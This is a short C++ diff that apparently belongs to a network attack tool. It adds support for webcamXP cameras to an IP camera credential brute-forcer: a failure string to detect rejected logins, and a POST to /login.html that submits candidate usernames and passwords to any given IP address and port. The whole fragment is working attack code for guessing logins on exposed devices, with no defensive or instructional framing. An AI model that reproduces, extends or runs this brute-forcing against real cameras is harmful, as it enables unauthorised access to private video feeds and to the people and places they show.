@@ -66,6 +66,10 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("action=\"setup_login.cgi\"");
 	}
+	else if (strcmp(SPEC, "WEBCAMXP") == 0)
+	{
+		negVector.push_back("Not logged in");
+	}
     else
     {
         stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
@@ -143,6 +147,12 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 				doPost = true;
 				sprintf(request, "%s:%d/setup_login.cgi", ip, port);
 				sprintf(postData, "check_username=%s&check_password=%s&login=", login, pass);
+			}
+			else if (strcmp(SPEC, "WEBCAMXP") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s:%d/login.html", ip, port);
+				sprintf(postData, "username=%s&password=%s&Redir=/", login, pass);
 			}
 
             std::string buffer;
